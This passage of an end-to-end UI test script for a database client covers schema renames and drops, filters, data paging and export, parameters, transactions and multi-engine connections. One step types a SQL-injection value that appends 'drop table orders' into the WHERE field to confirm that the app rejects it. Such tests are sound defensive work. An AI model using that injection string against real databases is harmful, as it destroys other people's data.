  await mainSchema.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Refresh all schemas" }).click();
  await probeNode.waitFor({ state: "detached" });
  assert.equal(await tablesFolder.locator(".muted").innerText(), "3");
  assert.equal(await tablesFolder.getAttribute("aria-expanded"), "true");
  // Rename (ADR-026): the dialog shows the core's SQL, and it runs only from there.
  await replaceQuery(panel, "create table rename_probe (id integer, a integer);\nselect 1 as created union all select 2 union all select 3;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "3 rows" }).waitFor();
  await mainSchema.focus();
  await page.keyboard.press("F5");
  const renameProbe = page.getByRole("button", { name: "Expand or collapse rename_probe", exact: true });
  await renameProbe.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Rename…" }).click();
  const renameDialog = page.getByRole("dialog", { name: "Rename rename_probe" });
  await renameDialog.locator('input[name="newName"]').fill("renamed_probe");
  const changeSql = renameDialog.getByLabel("SQL that will run");
  await changeSql.filter({ hasText: "ALTER TABLE rename_probe RENAME TO renamed_probe;" }).waitFor();
  await shot("05h-rename-dialog");
  await renameDialog.getByRole("button", { name: "Rename", exact: true }).click();
  await renameDialog.waitFor({ state: "detached" });
  const renamedProbe = page.getByRole("button", { name: "Expand or collapse renamed_probe", exact: true });
  await renamedProbe.waitFor();
  assert.equal(await renameProbe.count(), 0);
  // Metadata tabs apply the existing reviewed object action and refresh both views.
  await renamedProbe.locator(".twisty").click();
  const renamedChildren = renamedProbe.locator("xpath=..");
  await renamedChildren.getByRole("button", { name: "Expand or collapse Columns", exact: true }).locator(".label").dblclick();
  const renamedOverview = page.getByRole("region", { name: "Columns of renamed_probe" });
  await renamedOverview.getByText("a", { exact: true }).waitFor();
  await renamedOverview.getByText("a", { exact: true }).locator("xpath=..").getByRole("button", { name: "Rename…" }).click();
  const renameFromOverview = page.getByRole("dialog", { name: "Rename column a of renamed_probe" });
  await renameFromOverview.locator('input[name="newName"]').fill("a_temp");
  await renameFromOverview.getByLabel("SQL that will run").filter({ hasText: "RENAME COLUMN a TO a_temp" }).waitFor();
  await renameFromOverview.getByRole("button", { name: "Rename", exact: true }).click();
  await renamedOverview.getByText("a_temp", { exact: true }).waitFor();
  await renamedOverview.getByRole("row").filter({ hasText: "a_temp" }).getByRole("button", { name: "Rename…" }).click();
  const restoreColumn = page.getByRole("dialog", { name: "Rename column a_temp of renamed_probe" });
  await restoreColumn.locator('input[name="newName"]').fill("a");
  await restoreColumn.getByLabel("SQL that will run").filter({ hasText: "RENAME COLUMN a_temp TO a" }).waitFor();
  await restoreColumn.getByRole("button", { name: "Rename", exact: true }).click();
  await renamedOverview.getByText("a", { exact: true }).waitFor();
  await page.keyboard.press("Control+w");
  await renamedProbe.locator(".twisty").click();
  // F2 on a column renames it; its table reads its columns again.
  await renamedProbe.locator(".twisty").click();
  const probeColumns = renamedProbe.locator("xpath=..");
  await probeColumns.locator(".leaf-row", { hasText: /^a/ }).focus();
  await page.keyboard.press("F2");
  const columnDialog = page.getByRole("dialog", { name: "Rename column a of renamed_probe" });
  await columnDialog.locator('input[name="newName"]').fill("amount");
  await columnDialog.getByLabel("SQL that will run").filter({ hasText: "ALTER TABLE renamed_probe RENAME COLUMN a TO amount;" }).waitFor();
  await page.keyboard.press("Enter");
  await columnDialog.waitFor({ state: "detached" });
  const amountColumn = probeColumns.locator(".leaf-row", { hasText: "amount" });
  await amountColumn.waitFor();
  // Ctrl+click chooses columns; a new index takes them in that order (opened, not run).
  const idColumn = probeColumns.locator(".leaf-row", { hasText: /^id/ });
  await amountColumn.click({ modifiers: ["Control"] });
  await idColumn.click({ modifiers: ["Control"] });
  assert.equal(await idColumn.getAttribute("aria-selected"), "true");
  await idColumn.click({ button: "right" });
  await page.getByRole("menuitem", { name: "New index on (amount, id)" }).click();
  await panel.locator(".cm-content", { hasText: "CREATE INDEX" }).waitFor();
  assert.equal(
    (await panel.locator(".cm-content").innerText()).trimEnd(),
    "CREATE INDEX renamed_probe_amount_id_idx ON renamed_probe (amount, id);",
  );
  // SQLite adds constraints only when it creates a table.
  await idColumn.click({ button: "right" });
  assert.equal(await page.getByRole("menuitem", { name: /^New unique constraint/ }).count(), 0);
  await page.keyboard.press("Escape");
  await idColumn.click();
  assert.equal(await idColumn.getAttribute("aria-selected"), "false");
  // Drop: the core's SQL first, without "Cascade" on SQLite, which has none.
  await amountColumn.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Drop…" }).click();
  const dropColumn = page.getByRole("dialog", { name: "Drop renamed_probe.amount" });
  await dropColumn.getByLabel("SQL that will run").filter({ hasText: "ALTER TABLE renamed_probe DROP COLUMN amount;" }).waitFor();
  assert.equal(await dropColumn.locator('input[name="cascade"]').count(), 0);
  await dropColumn.getByRole("button", { name: "Drop", exact: true }).click();
  await amountColumn.waitFor({ state: "detached" });
  await renamedProbe.locator(".twisty").click();
  await renamedProbe.focus();
  await page.keyboard.press("Delete");
  const dropTable = page.getByRole("dialog", { name: "Drop renamed_probe" });
  await dropTable.getByLabel("SQL that will run").filter({ hasText: "DROP TABLE renamed_probe;" }).waitFor();
  await shot("05h-drop-dialog");
  await dropTable.getByRole("button", { name: "Drop", exact: true }).click();
  await renamedProbe.waitFor({ state: "detached" });
  // "New table" on the Tables folder: the core's statement in SQLite's types, opened, not run.
  await tablesFolder.click({ button: "right" });
  await page.getByRole("menuitem", { name: "New table" }).click();
  await panel.locator(".cm-content", { hasText: "CREATE TABLE new_table" }).waitFor();
  assert.equal(
    (await panel.locator(".cm-content").innerText()).trimEnd(),
    "CREATE TABLE new_table (\n  id INTEGER PRIMARY KEY,\n  name TEXT NOT NULL\n);",
  );
  assert.equal(await tablesFolder.locator(".muted").innerText(), "3");
  // Open object by name (Ctrl+Shift+D): found in the catalog, opened, and shown in the tree.
  const viewsFolder = page.getByRole("button", { name: "Expand or collapse Views", exact: true });
  await viewsFolder.click();
  assert.equal(await viewsFolder.getAttribute("aria-expanded"), "false");
  await page.keyboard.press("Control+Shift+D");
  const openObject = page.getByRole("dialog", { name: "Open object by name" });
  await openObject.getByRole("searchbox", { name: "Object name" }).fill("ORDERS");
  const results = openObject.getByRole("listbox", { name: "Objects found" });
  await results.getByRole("option").nth(1).waitFor();
  assert.deepEqual(
    await results.getByRole("option").locator(".label").allInnerTexts(),
    ["orders", "big_orders"],
  );
  await shot("05i-open-object");
  await page.keyboard.press("ArrowDown");
  await page.keyboard.press("Enter");
  await openObject.waitFor({ state: "detached" });
  await page.waitForFunction(() =>
    document.querySelector('[aria-label="Expand or collapse Views"]')?.getAttribute("aria-expanded") === "true",
  );
  await page.getByRole("button", { name: "Expand or collapse big_orders", exact: true }).waitFor();
  // Link with editor: the active tab (big_orders' data) is shown in the tree as it changes.
  await viewsFolder.click();
  assert.equal(await viewsFolder.getAttribute("aria-expanded"), "false");
  const linkWithEditor = page.getByRole("button", { name: "Link with editor" });
  // The toggle is a saved preference: its state shows once the save is done, so wait for it.
  await linkWithEditor.click();
  await linkWithEditor.and(page.locator('[aria-pressed="true"]')).waitFor();
  await page.waitForFunction(() =>
    document.querySelector('[aria-label="Expand or collapse Views"]')?.getAttribute("aria-expanded") === "true",
  );
  await linkWithEditor.click();
  await linkWithEditor.and(page.locator('[aria-pressed="false"]')).waitFor();
  // Bookmarks: listed above the connections; a click shows the object in the tree.
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Add bookmark" }).click();
  const ordersBookmark = page.getByRole("button", { name: "Bookmark orders: open it", exact: true });
  await ordersBookmark.waitFor();
  assert.equal(await ordersBookmark.locator(".muted").innerText(), "Shop (SQLite) · main");
  await ordersNode.locator(".bookmark-star").waitFor();
  await tablesFolder.click();
  assert.equal(await tablesFolder.getAttribute("aria-expanded"), "false");
  await ordersBookmark.click();
  await page.waitForFunction(() =>
    document.querySelector('[aria-label="Expand or collapse Tables"]')?.getAttribute("aria-expanded") === "true",
  );
  await shot("05j-bookmarks");
  await ordersBookmark.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Remove bookmark" }).click();
  await ordersBookmark.waitFor({ state: "detached" });
  assert.equal(await ordersNode.locator(".bookmark-star").count(), 0);
  // big_orders' data tab, opened by name above, is closed: later steps look for "orders" tabs.
  await page.keyboard.press("Control+w");
  await page.locator(".tabbar .tab", { hasText: "big_orders" }).waitFor({ state: "detached" });
  assert.equal(await tablesFolder.locator(".muted").innerText(), "3");
  // Quick filter (Ctrl+Shift+F): only what matches by name, plus the expanded connections.
  await page.keyboard.press("Control+Shift+F");
  const quickFilter = page.getByRole("searchbox", { name: "Filter the explorer" });
  await quickFilter.waitFor();
  await page.waitForFunction(() => document.activeElement?.getAttribute("aria-label") === "Filter the explorer");
  await page.keyboard.insertText("ord");
  await page.getByRole("button", { name: "Expand or collapse customer", exact: true }).waitFor({ state: "detached" });
  await ordersNode.waitFor();
  await page.getByRole("button", { name: "Expand or collapse big_orders", exact: true }).waitFor();
  assert.equal(await tablesFolder.locator(".muted").innerText(), "1");
  assert.equal(await page.locator('.connection-row:has-text("MariaDB (Docker)")').count(), 0);
  await page.keyboard.press("Escape");
  assert.equal(await quickFilter.inputValue(), "");
  await page.locator('.connection-row:has-text("MariaDB (Docker)")').waitFor();
  await page.keyboard.press("Escape");
  await quickFilter.waitFor({ state: "detached" });
  assert.equal(await tablesFolder.locator(".muted").innerText(), "3");
  // Filters as in DBeaver: right-click a folder, Configure filter…; the folder says it is filtered.
  const customerNode = page.getByRole("button", { name: "Expand or collapse customer", exact: true });
  const filterDialog = page.getByRole("dialog", { name: "Filter of tables, views and other objects for Shop (SQLite)" });
  await tablesFolder.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Configure filter…" }).click();
  await filterDialog.locator('input[name="objects.exclude"]').fill("CUST*");
  await filterDialog.getByRole("button", { name: "Apply" }).click();
  await filterDialog.waitFor({ state: "detached" });
  await customerNode.waitFor({ state: "detached" });
  assert.equal(await tablesFolder.locator(".muted").innerText(), "2");
  await tablesFolder.locator(".tag", { hasText: "filtered" }).waitFor();
  await shot("05h-filtered-folder");
  // Filtered on this computer instead of in the catalog query: the same tables.
  const setServerSide = (checked) =>
    withSettings("explorer", async (settings) => {
      await settings.locator('input[name="serverSideFilters"]').setChecked(checked);
      await page.waitForFunction((want) => {
        const input = document.querySelector('input[name="serverSideFilters"]');
        return input?.checked === want && !input.disabled;
      }, checked);
    });
  await setServerSide(false);
  await mainSchema.focus();
  await page.keyboard.press("F5");
  await ordersNode.waitFor();
  assert.equal(await customerNode.count(), 0);
  assert.equal(await tablesFolder.locator(".muted").innerText(), "2");
  await setServerSide(true);
  await tablesFolder.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Configure filter…" }).click();
  assert.equal(await filterDialog.locator('input[name="objects.exclude"]').inputValue(), "CUST*");
  await filterDialog.getByRole("button", { name: "Show everything" }).click();
  await customerNode.waitFor();
  assert.equal(await tablesFolder.locator(".tag").count(), 0);
  // "Hide" and "Show only" on one object write its name into the same filter.
  await customerNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Hide customer" }).click();
  await customerNode.waitFor({ state: "detached" });
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Show only orders" }).click();
  await page.getByRole("button", { name: "Expand or collapse product", exact: true }).waitFor({ state: "detached" });
  assert.equal(await tablesFolder.locator(".muted").innerText(), "1");
  await tablesFolder.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Configure filter…" }).click();
  assert.equal(await filterDialog.locator('input[name="objects.include"]').inputValue(), "orders");
  assert.equal(await filterDialog.locator('input[name="objects.exclude"]').inputValue(), "customer");
  await filterDialog.getByRole("button", { name: "Show everything" }).click();
  await customerNode.waitFor();
  assert.equal(await tablesFolder.locator(".muted").innerText(), "3");
  // Only the connected connections: Shop is open; nothing has connected to the Docker ones yet.
  const connectedOnly = page.getByRole("button", { name: "Show only connected connections" });
  await connectedOnly.click();
  await page.locator('.connection-row:has-text("MariaDB (Docker)")').waitFor({ state: "detached" });
  assert.equal(await page.locator('.connection-row:has-text("Postgres (Docker)")').count(), 0);
  assert.equal(await page.locator('.connection-row:has-text("Shop (SQLite)")').count(), 1);
  assert.equal(await connectedOnly.getAttribute("aria-pressed"), "true");
  await connectedOnly.click();
  await page.locator('.connection-row:has-text("MariaDB (Docker)")').waitFor();
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Count rows" }).click();
  const exactCount = ordersNode.locator('[title="Exact row count: 50,000"]');
  await exactCount.waitFor();
  assert.equal(await exactCount.innerText(), "50K");
  assert.equal(await ordersNode.getAttribute("aria-description"), "Exact row count: 50,000");
  await setLanguage("es");
  const ordersNodeEs = page.getByRole("button", { name: "Expandir o contraer orders", exact: true });
  const spanishCount = ordersNodeEs.locator('[title="Número exacto de filas: 50.000"]');
  await spanishCount.waitFor();
  assert.equal(await spanishCount.innerText(), new Intl.NumberFormat("es", { notation: "compact", maximumFractionDigits: 1 }).format(50_000));
  await setLanguage("en");

  step("table data: pages, WHERE and ORDER BY written and checked by the core");
  await ordersNode.locator(".label").dblclick();
  assert.equal(await ordersNode.getAttribute("aria-expanded"), "false");
  await page.locator(".tabbar .tab.active", { hasText: "orders" }).waitFor();
  const range = panel.locator(".table-range");
  await range.filter({ hasText: "rows 1–500" }).waitFor();
  await panel.getByText("This page only", { exact: true }).waitFor();
  // Export takes every row the WHERE keeps, in the ORDER BY, not only the page on screen.
  await panel.getByRole("textbox", { name: "WHERE" }).fill("id > 49000");
  await panel.getByRole("textbox", { name: "ORDER BY" }).fill("id desc");
  await page.keyboard.press("Enter");
  await range.filter({ hasText: "rows 1–500" }).waitFor();
  {
    const path = join(userDir, "orders-filtered.csv");
    await page.evaluate((target) => (window.__spelaionSavePath = target), path);
    await panel.locator(".export-button").getByRole("button", { name: "Export…" }).click();
    const dialog = page.getByRole("dialog", { name: "Export result" });
    assert.ok(await dialog.getByRole("radio", { name: /^Every row the filter keeps/ }).isChecked());
    await dialog.getByRole("button", { name: "Export…" }).click();
    await dialog.locator(".export-result", { hasText: "Exported 1,000 rows" }).waitFor();
    await dialog.getByRole("button", { name: "Close" }).click();
    await page.evaluate(() => delete window.__spelaionSavePath);
    const lines = readFileSync(path, "utf8").trimEnd().split("\r\n");
    assert.equal(lines.length, 1_001);
    assert.ok(lines[1].startsWith("50000,"), lines[1]);
    assert.ok(lines[1_000].startsWith("49001,"), lines[1_000]);
  }
  await panel.getByRole("textbox", { name: "ORDER BY" }).fill("");
  await panel.getByRole("textbox", { name: "WHERE" }).fill("total > 1990");
  await page.keyboard.press("Enter");
  await range.filter({ hasText: "rows 1–264" }).waitFor();
  await panel.getByRole("button", { name: "Count", exact: true }).click();
  await range.filter({ hasText: "rows 1–264 of 264" }).waitFor();
  assert.ok(await panel.getByRole("button", { name: "Next page" }).isDisabled());
  await shot("05i-table-data");
  await panel.getByRole("textbox", { name: "WHERE" }).fill("");
  await panel.getByRole("button", { name: "Apply", exact: true }).click();
  await range.filter({ hasText: "rows 1–500" }).waitFor();
  await panel.locator(".statusline", { hasText: "500 rows" }).waitFor();
  const firstPageResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
  await panel.getByRole("button", { name: "Next page" }).click();
  await range.filter({ hasText: "rows 501–1,000" }).waitFor();
  await page.waitForFunction((button) => !button.isConnected, firstPageResult);
  await panel.locator(".statusline", { hasText: "500 rows" }).waitFor();
  // A header click sorts in the server: ORDER BY written with the engine's quoting.
  {
    // The new page mounts a new grid: wait until it is laid out.
    let box = null;
    for (let i = 0; i < 40 && !box; i++) {
      box = await panel.locator(".grid-scroller").boundingBox();
      if (!box) await page.waitForTimeout(100);
    }
    await page.mouse.click(box.x + 52 + 20, box.y + 18);
    await page.mouse.click(box.x + 52 + 20, box.y + 18);
    await panel.locator('.grid-scroller[aria-label$="sorted by id, descending"]').waitFor();
    assert.equal(await panel.getByRole("textbox", { name: "ORDER BY" }).inputValue(), "id DESC");
    await range.filter({ hasText: "rows 1–500" }).waitFor();
    // The sort shows at once; the page it asked for may still be on its way.
    let firstId = "";
    for (let i = 0; i < 20 && firstId !== "50000"; i++) {
      if (i > 0) await page.waitForTimeout(250);
      const grid = await panel.locator(".grid-scroller").boundingBox();
      if (!grid) continue;
      const before = await page.evaluate(() => window.__copied.length);
      await page.mouse.click(grid.x + 52 + 20, grid.y + 36 + 13);
      await page.keyboard.press("Control+c");
      // While that page is on its way there may be no cell to copy yet: try again, not wait.
      const copiedNow = await page
        .waitForFunction((n) => window.__copied.length > n, before, { timeout: 3000 })
        .then(() => true, () => false);
      if (copiedNow) firstId = (await page.evaluate(() => window.__copied[window.__copied.length - 1])).trimEnd();
    }
    assert.equal(firstId, "50000");
  }
  // "Filter by this value" goes to the table's WHERE, written by the core.
  {
    const grid = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.click(grid.x + 52 + 20, grid.y + 36 + 13, { button: "right" });
    await panel.locator(".result-grid-menu").getByRole("menuitem", { name: "Filter ▸" }).hover();
    await panel.getByText("Added to the table's WHERE").waitFor();
    await panel.getByRole("menuitem", { name: "id = 50000", exact: true }).click();
    await range.filter({ hasText: "rows 1–1" }).waitFor();
    assert.equal(await panel.getByRole("textbox", { name: "WHERE" }).inputValue(), "id = 50000");
    let box = null;
    for (let i = 0; i < 40 && !box; i++) {
      box = await panel.locator(".grid-scroller").boundingBox();
      if (!box) await page.waitForTimeout(100);
    }
    const widths = (await panel.locator(".grid-scroller").getAttribute("data-column-widths")).split(",").map(Number);
    const createdX = box.x + 52 + widths[0] + widths[1] + 20;
    await page.mouse.click(createdX, box.y + 36 + 13, { button: "right" });
    await panel.locator(".result-grid-menu").getByRole("menuitem", { name: "Filter ▸" }).hover();
    await panel.getByRole("menuitem", { name: /^created contains '/ }).click();
    await page.waitForFunction(() => document.querySelector('input[aria-label="WHERE"]')?.value.includes(" AND "));
    assert.match(await panel.getByRole("textbox", { name: "WHERE" }).inputValue(), /^id = 50000 AND created LIKE '%\d{4}-\d{2}-\d{2}%' ESCAPE '!'$/);
    await range.filter({ hasText: "rows 1–1" }).waitFor();
    await shot("05i2-table-filter-by-value");
    // Names qualified with the table, written like the explorer's.
    box = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.click(box.x + 52 + 20, box.y + 18, { button: "right" });
    const before = await page.evaluate(() => window.__copied.length);
    await panel.locator(".result-grid-menu").getByRole("menuitem", { name: "Copy column names ▸" }).hover();
    await panel.getByRole("menuitem", { name: "Qualified with the table" }).click();
    assert.equal(await copied(before + 1), "orders.id");
  }
  // What is typed cannot turn the page into another statement.
  await panel.getByRole("textbox", { name: "WHERE" }).fill("1=1); drop table orders; select (1");
  await page.keyboard.press("Enter");
  await panel.locator(".error-box", { hasText: "must not change the query" }).waitFor();
  await page.keyboard.press("Control+w");
  await page.locator(".tabbar .tab.active", { hasText: "orders" }).waitFor({ state: "detached" });

  step("query parameters: :name values asked once, written in by the core");
  await replaceQuery(panel, "select :name as who, :n + 1 as next, :name || '!' as again;");
  await run(panel);
  const paramsDialog = page.getByRole("dialog", { name: "Query parameters" });
  await paramsDialog.locator(".field .mono").nth(1).waitFor();
  assert.deepEqual(await paramsDialog.locator(".field .mono").allInnerTexts(), [":name", ":n"]);
  await page.keyboard.insertText("O'Brien");
  await paramsDialog.locator("input").nth(1).fill("41");
  await shot("05g-query-parameters");
  await page.keyboard.press("Enter");
  await paramsDialog.waitFor({ state: "detached" });
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  {
    const box = await panel.locator(".grid-scroller").boundingBox();
    const before = await page.evaluate(() => window.__copied.length);
    await page.mouse.click(box.x + 80, box.y + 36 + 13);
    await page.keyboard.press("Control+a");
    await page.keyboard.press("Control+c");
    assert.equal((await copied(before + 1)).trimEnd(), "O'Brien\t42\tO'Brien!");
  }
  // The values are offered again; Escape cancels without running.
  await run(panel);
  assert.equal(await page.getByRole("dialog", { name: "Query parameters" }).locator("input").first().inputValue(), "O'Brien");
  await page.keyboard.press("Escape");
  await page.getByRole("dialog", { name: "Query parameters" }).waitFor({ state: "detached" });

  step("saved queries: Ctrl+S names the SQL, the panel opens and deletes it");
  await replaceQuery(panel, "select 'snippet_marker' as saved;");
  await page.keyboard.press("Control+s");
  const saveDialog = page.getByRole("dialog", { name: "Save query" });
  await saveDialog.getByLabel("Name").fill("Marker query");
  await page.keyboard.press("Enter");
  await panel.getByRole("status").filter({ hasText: "Saved as “Marker query”" }).waitFor();
  // Saving again offers the same name and replaces the saved SQL.
  await replaceQuery(panel, "select 'snippet_marker' as saved, 2 as version;");
  await panel.getByRole("button", { name: "Save", exact: true }).click();
  assert.equal(await page.getByRole("dialog", { name: "Save query" }).getByLabel("Name").inputValue(), "Marker query");
  await page.keyboard.press("Enter");
  await page.getByRole("button", { name: "Saved queries", exact: true }).click();
  const snippets = page.getByRole("complementary", { name: "Saved queries" });
  const markerEntry = snippets.locator(".snippet-entry", { hasText: "Marker query" });
  await markerEntry.locator(".history-sql", { hasText: "2 as version" }).waitFor();
  assert.equal(await snippets.locator(".snippet-entry").count(), 1);
  await shot("05h-saved-queries");
  await markerEntry.getByRole("button", { name: "Open" }).click();
  await snippets.waitFor({ state: "detached" });
  assert.equal(await panel.locator(".cm-content").innerText(), "select 'snippet_marker' as saved, 2 as version;");
  await page.getByRole("button", { name: "Saved queries", exact: true }).click();
  await markerEntry.getByRole("button", { name: "Delete" }).click();
  await markerEntry.getByRole("button", { name: "Confirm delete" }).click();
  await snippets.getByText("No saved queries yet.", { exact: false }).waitFor();
  await page.getByRole("button", { name: "Close saved queries" }).click();

  step("direct PostgreSQL: password asked in a dialog");
  panel = await newQuery(
    "Postgres (Docker)",
    "select id, txt, ts, amount, flag, maybe_null, uid, doc\nfrom big\norder by id\nlimit 1000;",
  );
  await run(panel);
  await page.getByRole("dialog").getByText("Password for Postgres (Docker)").waitFor();
  // A wrong password first: it is asked again showing the reason.
  await page.getByLabel("Password", { exact: true }).fill("wrong");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await page.getByRole("dialog").getByText("password authentication failed").waitFor();
  await shot("06-wrong-password");
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await panel.locator(".statusline", { hasText: "1,000 rows" }).waitFor();
  await shot("07-postgres");

  step("a session the server ended: shown as lost, nothing re-run, reconnected on a click");
  await replaceQuery(panel, "select pg_terminate_backend(pg_backend_pid());");
  await run(panel);
  const lost = panel.locator(".status-lost");
  await lost.waitFor();
  assert.match(await lost.innerText(), /Connection lost/);
  // Running again does not reconnect on its own: it says why.
  await replaceQuery(panel, "select 'after reconnect' as marker;");
  await run(panel);
  await panel.getByText("The connection was lost", { exact: false }).first().waitFor();
  assert.equal(await panel.locator(".status-lost").count(), 1);
  await shot("07a-connection-lost");
  await lost.getByRole("button", { name: "Reconnect" }).click();
  // The prompted password lived with the lost session: it is asked again.
  const passwordDialog = page.getByRole("dialog").getByText("Password for Postgres (Docker)");
  await passwordDialog.waitFor();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await panel.locator(".status-connected").waitFor();
  await panel.getByText("Reconnected. Nothing was run again.", { exact: true }).waitFor();
  await run(panel);
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();

  step("transactions: auto-commit off, the TX badge, Rollback and Commit, and closing asks first");
  // ADR-031: the core keeps the tab's transaction; the toolbar and the tab only show it.
  const autoCommit = panel.locator(".transaction-controls").getByRole("checkbox", { name: "Auto-commit" });
  assert.ok(await autoCommit.isChecked());
  await replaceQuery(panel, "create temp table tx_smoke (id int);");
  await run(panel);
  await panel.getByText("Statement 1: OK", { exact: false }).first().waitFor();
  assert.equal(await panel.locator(".tx-badge").count(), 0, "auto-commit leaves no transaction open");
  // The switch shows what the core answers, so it changes once the core has done it.
  await autoCommit.click();
  await panel.locator(".transaction-controls input[type=checkbox]:not(:checked)").waitFor();
  await panel.getByRole("button", { name: "Commit", exact: true }).waitFor();
  await replaceQuery(panel, "insert into tx_smoke values (1);\ninsert into tx_smoke values (2);");
  await run(panel);
  await panel.locator(".tx-badge", { hasText: "TX open · 2" }).waitFor();
  await page.locator(".tabbar .tab.active .tab-tx").waitFor();
  // Auto-commit cannot come back on while the transaction is open: commit or roll back first.
  assert.ok(await autoCommit.isDisabled());
  await shot("07b-transaction-open");
  await panel.getByRole("button", { name: "Rollback", exact: true }).click();
  await panel.getByText("Transaction rolled back.", { exact: false }).waitFor();
  await panel.locator(".tx-badge").waitFor({ state: "detached" });
  assert.equal(await page.locator(".tabbar .tab.active .tab-tx").count(), 0);
  await replaceQuery(panel, "insert into tx_smoke values (3);");
  await run(panel);
  await panel.locator(".tx-badge", { hasText: "TX open · 1" }).waitFor();
  await panel.getByRole("button", { name: "Commit", exact: true }).click();
  await panel.getByText("Transaction committed.", { exact: false }).waitFor();
  await panel.locator(".tx-badge").waitFor({ state: "detached" });
  // Closing the tab with a transaction open asks first; Cancel keeps it.
  await replaceQuery(panel, "delete from tx_smoke where id = 3;");
  await run(panel);
  await panel.locator(".tx-badge", { hasText: "TX open · 1" }).waitFor();
  await page.locator(".tabbar .tab.active .close").click();
  const closeOpen = page.getByRole("dialog", { name: "Close with an open transaction?" });
  await closeOpen.getByText("the server rolls back what was not committed", { exact: false }).waitFor();
  assert.equal(await closeOpen.locator(".risk-list li").count(), 1);
  await shot("07c-close-open-transaction");
  // Cancel has the focus: a reflex Enter keeps the tab.
  await page.keyboard.press("Enter");
  await closeOpen.waitFor({ state: "detached" });
  await panel.locator(".tx-badge").waitFor();
  // Switching the tab's connection asks too.
  await panel.locator(".toolbar select").first().selectOption({ label: "Shop (SQLite) (sqlite)" });
  const switchOpen = page.getByRole("dialog", { name: "Disconnect with an open transaction?" });
  await switchOpen.getByRole("button", { name: "Cancel", exact: true }).click();
  await switchOpen.waitFor({ state: "detached" });
  await panel.locator(".tx-badge").waitFor();
  // A session lost with a transaction open says so; nothing reconnects or re-runs.
  await replaceQuery(panel, "select pg_terminate_backend(pg_backend_pid());");
  await run(panel);
  const lostOpen = panel.locator(".status-lost");
  await lostOpen.getByText("A transaction was open", { exact: false }).waitFor();
  assert.equal(await page.locator(".tabbar .tab.active .tab-tx").count(), 0);
  await shot("07d-lost-with-transaction");
  await lostOpen.getByRole("button", { name: "Reconnect" }).click();
  await page.getByRole("dialog").getByText("Password for Postgres (Docker)").waitFor();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await panel.locator(".status-connected").waitFor();
  // A new session starts from its type's default: auto-commit.
  await autoCommit.waitFor();
  assert.ok(await autoCommit.isChecked());

  step("MySQL and MariaDB: password, TLS, types and the schema explorer");
  // Only an encrypted session has a cipher: the row exists only if TLS is on.
  for (const [connection, version, status] of [
    ["MySQL (Docker)", /8\.4\./, "performance_schema.session_status"],
    ["MariaDB (Docker)", /MariaDB/, "information_schema.session_status"],
  ]) {
    panel = await newQuery(
      connection,
      `select 42 as answer, 'text ñ €' as txt, cast('2026-01-31' as date) as day, variable_value as cipher
from ${status}
where variable_name = 'Ssl_cipher' and variable_value <> '';`,
    );
    await panel.getByRole("button", { name: "Connect to choose database" }).click();
    await page.getByRole("dialog").getByText(`Password for ${connection}`).waitFor();
    await page.getByLabel("Password", { exact: true }).fill("spelaion");
    await page.getByRole("button", { name: "Connect", exact: true }).click();
    const database = panel.getByLabel("Database", { exact: true });
    await database.locator('option[value="information_schema"]').waitFor({ state: "attached" });
    await page.waitForFunction((el) => !el.disabled && el.value === "spelaion", await database.elementHandle());
    await run(panel);
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
    assert.match(await panel.locator(".status-connected").innerText(), version);
    if (connection.startsWith("MySQL")) await shot("07b-mysql");
    await page.waitForFunction((el) => !el.disabled && el.value === "spelaion", await database.elementHandle());
    await database.selectOption("information_schema");
    await page.waitForFunction((el) => !el.disabled && el.value === "information_schema", await database.elementHandle());
    await replaceQuery(panel, "select 1 where database() = 'information_schema';");
    let previousResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
    await run(panel);
    await page.waitForFunction((el) => !el.isConnected, previousResult);
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
    await page.waitForFunction((el) => !el.disabled, await database.elementHandle());
    await replaceQuery(panel, "use spelaion; select 1 where database() = 'spelaion';");
    previousResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
    await run(panel);
    await page.waitForFunction((el) => !el.isConnected, previousResult);
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
    await page.waitForFunction((el) => !el.disabled && el.value === "spelaion", await database.elementHandle());
  }
  step("process monitor: independent connection, filtering and SQL details");
  const currentSqlBeforeMonitor = await panel.locator(".cm-content").innerText();
  await activities.getByRole("button", { name: "Processes", exact: true }).click();
  const processSidebar = page.locator("#processes-sidebar");
  assert.ok(await processSidebar.getByRole("button", { name: /Shop \(SQLite\)/ }).isDisabled());
  await processSidebar.getByRole("button", { name: "MySQL (Docker)", exact: true }).click();
  const monitor = page.getByRole("region", { name: "Processes", exact: true });
  await monitor.locator(".process-table tbody tr").first().waitFor();
  assert.ok(await monitor.locator(".process-table tbody tr").count() >= 1);
  await monitor.locator(".process-table tbody tr:has(.process-own)").click();
  await monitor.getByText("This is the monitoring connection.", { exact: true }).waitFor();
  assert.ok(await monitor.getByRole("button", { name: "End connection" }).isDisabled());
  assert.ok(await monitor.getByRole("button", { name: "Cancel query" }).isDisabled());
  // The process-control command accepts the structured target and must reject calls that
  // have not passed the confirmation step. This uses an isolated test session.
  const unconfirmedError = await page.evaluate(async () => {
    const invoke = window.__TAURI_INTERNALS__.invoke;
